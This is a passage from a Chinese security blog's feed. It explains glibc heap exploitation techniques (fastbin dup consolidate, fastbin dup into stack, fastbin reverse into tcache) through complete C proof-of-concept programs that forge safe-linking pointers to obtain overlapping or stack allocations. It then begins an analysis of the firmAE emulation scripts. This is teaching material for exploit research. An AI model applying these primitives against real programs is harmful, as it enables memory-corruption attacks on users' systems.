class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line"><span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个主要是利用了<code>malloc_consolidate</code>把fastbin与top chunk进行合并的一个过程。首先还是常规的塞满tcache bin</p><p>然后申请一个chunk (p1)，再free掉，这个chunk会被放进fastbin</p><p>然后申请一个0x400大小的chunk，它属于large bin范围，会进入<code>__int_malloc</code>的这个分支，调用<code>malloc_consolidate</code>进行fastbin整理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就把原先处于fastbin的p1合并进了top chunk，然后又在top chunk被分配出来，变成了p3。</p><p>此时我们如果有个double free的利用，free掉 p1，再申请一个0x400大小的p4,就能获取两个指向同一个chunk的指针(p3和p4)，可以进行泄露地址与利用</p><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking calloc into\n&quot;</span></span><br><span class="line">       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">2</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want calloc() to return is %p.\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line"><span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line"><span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line"><span class="string">&quot;so that calloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line"><span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">stack_var[<span class="number">1</span>] = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ptr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) d;</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">*d = (addr &gt;&gt; <span class="number">12</span>) ^ ptr;</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th calloc(1,8): %p\n&quot;</span>, p);</span><br><span class="line">assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var + <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个和刚刚的fastbin_dup差不多，就是提到的两个利用之一：修改链表指向导致任意地址申请，只不过这里比较特殊，是栈地址</p><h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;An heap address leak is needed to perform this attack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">   <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">   <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">   <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">   <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">   <span class="string">&quot;a single free is sufficient.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line"><span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line"><span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>, &amp;stack_var[<span class="number">2</span>], (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line"><span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"><span class="comment">// The following operation assumes the address of victim is known, thus requiring</span></span><br><span class="line"><span class="comment">// a heap leak.</span></span><br><span class="line">*(<span class="keyword">size_t</span>**)victim = (<span class="keyword">size_t</span>*)((<span class="keyword">long</span>)&amp;stack_var[<span class="number">0</span>] ^ ((<span class="keyword">long</span>)victim &gt;&gt; <span class="number">12</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line"><span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">   <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">   <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">   <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">   <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">   <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>, q);</span><br><span class="line"></span><br><span class="line">assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前也断断续续看过一些libc的实现（在之前的fastbin reverse into tcache以及large bin attack文章中总结过一些），但是总感觉不太连贯，没有形成一个体系。并且光干看代码总感觉少点什么。如果看别的大佬的博客的话，最终还是别人的，远远没有</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://phot0n.com/tags/heap/"/>
    
    <category term="IO_FILE" scheme="http://phot0n.com/tags/IO-FILE/"/>
    
    <category term="libc" scheme="http://phot0n.com/tags/libc/"/>
    
  </entry>
  
  <entry>
    <title>firmAE框架分析</title>
    <link href="http://phot0n.com/2023/02/26/firmAE%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"/>
    <id>http://phot0n.com/2023/02/26/firmAE%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/</id>
    <published>2023-02-26T04:51:50.000Z</published>
    <updated>2023-03-31T08:37:07.071Z</updated>
    
    <content type="html"><![CDATA[<p>因为最近主要工作是iot模拟，包括利用firmadyne,firmAE等去模拟一些路由器然后去进行模糊测试之类的。所以最好还是把firmAE整个框架分析一下，这样才能知道大概去往什么方向去改进以及优化。</p><p>firmAE是在firmadyne基础上进行开发的，它主要构成是一些bash脚本，对运行的固件首先进行提取，尝试提取其中的kernel，文件系统等。然后将解包的文件系统挂载起来，往里面放一些firmadyne的东西然后再进行打包处理。之后似乎是进行对网卡的推断与模拟</p><p>我们一步一步来，首先是关键的<code>run.sh</code>，firmAE通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh -r [brand] [file]</span><br></pre></td></tr></table></figure><p>来运行固件</p><p>大体上可以分为这么几个模块:提取kernel、提取文件系统、检查架构、制作qemu镜像、配置网卡、运行</p><p>我们首先对run.sh进行分析，如果需要分析相应模块再深入去探索</p><p>首先是引入目录下的<code>./firmae.config</code>文件，这个文件提供了一些路径以及常用函数之类的配置，这里先不对其详细地分析，如果有用到其中的函数再对其进行分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e ./firmae.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ./firmae.config</span><br><span class="line"><span class="keyword">elif</span> [ -e ../firmae.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ../firmae.config</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Could not find &#x27;firmae.config&#x27;!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>然后就是检车是否为ROOT下运行，之后通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$&#123;FIRMWARE&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    run_emulation <span class="variable">$&#123;FIRMWARE&#125;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    FIRMWARES=`find <span class="variable">$&#123;3&#125;</span> -<span class="built_in">type</span> f`</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> FIRMWARE <span class="keyword">in</span> <span class="variable">$&#123;FIRMWARES&#125;</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> [ ! -d <span class="variable">$&#123;FIRMWARE&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">            run_emulation <span class="variable">$&#123;FIRMWARE&#125;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>判断是运行文件夹内的所有固件还是单个固件</p><p>然后就是开始运行run.sh中最重要的<code>run_emulation</code>函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 